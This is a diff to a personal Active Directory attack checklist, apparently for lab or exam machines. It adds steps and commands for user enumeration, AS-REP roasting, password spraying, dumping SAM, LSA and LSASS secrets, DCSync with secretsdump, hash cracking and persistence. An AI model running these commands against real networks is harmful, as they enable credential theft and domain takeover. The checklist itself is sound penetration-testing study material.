@@ -1,7 +1,7 @@
 # AD checklist
 
 ## Before I start
-At the pwn-broker prompt: tool install netexec and tool install impacket.
+At the pwn-broker prompt: tool install netexec, tool install impacket, tool install kerbrute and tool install certipy.
 - [ ] All TCP ports on every host, then the top UDP ports: :Pb ports
 - [ ] The domain name and the DC's host name, from the scan or from nxc
 nxc smb <DCIP>
@@ -19,6 +19,7 @@ kerbrute userenum -d <Domain> --dc <DCIP> /usr/share/seclists/Usernames/xato-net
 grep 'VALID USERNAME' kerbrute.txt | awk '{print $NF}' | cut -d '@' -f1 >> users.txt
 - [ ] AS-REP roasting with that list: :Pb asrep
 impacket-GetNPUsers '<Domain>/' -usersfile users.txt -no-pass -dc-ip <DCIP> -format hashcat -outputfile asrep.txt
+- [ ] Computer account hashes from the DC's time service, with no login: :Pb timeroasting
 - [ ] The lockout policy read, then each username tried as its own password: :Pb spraying
 nxc smb <DCIP> -u users.txt -p users.txt --no-bruteforce --continue-on-success
 - [ ] Broadcasts watched with Responder's analyze mode, or a deliberate connection caught with a non-poisoning SMB listener: :Pb responder
@@ -29,6 +30,7 @@ nxc smb <DCIP> -u users.txt -p users.txt --no-bruteforce --continue-on-success
 ## With a domain credential
 nxc smb <DCIP> -d <Domain> -u '<Username>' -p '<Password>'
 - [ ] Tried on every host and protocol: SMB, WinRM, RDP, MSSQL and LDAP, in :Pb smb
+- [ ] A login on an MSSQL server: impersonation and linked servers, :Pb mssql-impersonation
 - [ ] Users, groups, the password policy and every description: :Pb domain-enum and :Pb ldap
 - [ ] Kerberoasting: :Pb kerberoasting
 - [ ] A cracked service account forged into a silver ticket to its service, with no DC: :Pb golden-silver
@@ -37,15 +39,17 @@ nxc smb <DCIP> -d <Domain> -u '<Username>' -p '<Password>' -M gpp_password
 - [ ] BloodHound collected, and read from every principal I own
 nxc ldap <DCIP> -d <Domain> -u '<Username>' -p '<Password>' --bloodhound --collection All --dns-server <DCIP>
 - [ ] Outbound object control from each owned user and its groups: :Pb acl-abuse
-- [ ] LAPS, gMSA and the machine account quota
+- [ ] LAPS, gMSA and the machine account quota: :Pb laps, :Pb gmsa, :Pb machine-account-abuse
 nxc ldap <DCIP> -d <Domain> -u '<Username>' -p '<Password>' -M laps
 nxc ldap <DCIP> -d <Domain> -u '<Username>' -p '<Password>' --gmsa
 nxc ldap <DCIP> -d <Domain> -u '<Username>' -p '<Password>' -M maq
 - [ ] Unconstrained, constrained and resource-based delegation: :Pb delegation
 impacket-findDelegation '<Domain>/<Username>:<Password>' -dc-ip <DCIP>
-- [ ] Certificate services and their templates: :Pb adcs
+- [ ] Certificate services and their templates: :Pb adcs, with :Pb adcs-esc to tell one ESC from another
 certipy find -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -vulnerable -stdout
 - [ ] A GPO I can edit, from BloodHound: :Pb gpo-abuse
+- [ ] SCCM or WSUS in the domain: :Pb sccm-wsus
+- [ ] Deleted objects, where the recycle bin is on: :Pb ad-recycle-bin
 - [ ] A share people browse that I can write: a lure file there, and a non-poisoning SMB listener for the hash: :Pb responder
 
 ## On every host I own
@@ -55,6 +59,7 @@ nxc smb <TargetIP> -d <Domain> -u '<Username>' -p '<Password>' --sam
 nxc smb <TargetIP> -d <Domain> -u '<Username>' -p '<Password>' --lsa
 nxc smb <TargetIP> -d <Domain> -u '<Username>' -p '<Password>' -M lsassy
 - [ ] Credentials in files, history and configs: snaffler's Snaffler.exe and peass-ng's winPEASx64.exe, from serve
+- [ ] Saved credentials behind DPAPI, for every user of the host: :Pb dpapi
 - [ ] New hashes cracked, and every password and hash tried everywhere: :Pb hash-cracking
 hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
 - [ ] The next host reached with what I have: :Pb smb, where this credential works, and :Pb remote-access
@@ -63,8 +68,12 @@ hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
 
 ## Domain admin
 impacket-secretsdump -just-dc-ntlm '<Domain>/<Username>:<Password>@<DCIP>'
+- [ ] One account, or krbtgt alone: :Pb dcsync
 - [ ] The Administrator hash into evil-winrm on the DC for the proof
+- [ ] Persistence, where I am asked to show it: :Pb golden-silver, :Pb sidhistory-adminsdholder
 - [ ] Other domains in a trust: the same checklist again from the top
+My clock back on NTP when the box is done:
+sudo timedatectl set-ntp on
 
 ## Stuck
 - [ ] Every credential on every protocol and host, with --local-auth as well
